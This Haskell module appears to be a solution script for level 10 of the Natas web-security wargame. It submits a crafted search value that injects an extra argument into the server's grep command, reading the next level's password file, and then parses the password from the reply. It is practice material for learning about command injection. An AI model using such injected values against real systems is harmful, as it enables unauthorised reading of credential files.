{-# LANGUAGE OverloadedStrings #-}

module Natas.Natas10 where

import           Data.Maybe           (catMaybes)

import           Data.ByteString.Lazy (ByteString)
import qualified Data.Text            as T
import           Safe                 (lastMay)

import           Network.Wreq         (FormParam ((:=)), postWith)

import           Natas.Natas
import           Natas.Parse

solution :: Solution
solution = do
  let needle = ".* /etc/natas_webpass/natas11 #" :: ByteString
      form = ["needle" := needle, "submit" := ("Search" :: ByteString)]
  opts <- loginOptions 10
  req <- postWith opts (parentUri 10) form
  let body = reqBody req
      match = catMaybes (workupBody' (fmap lastMay) body)
  pure $ penultimateMay match >>= (lastMay . T.splitOn ":")
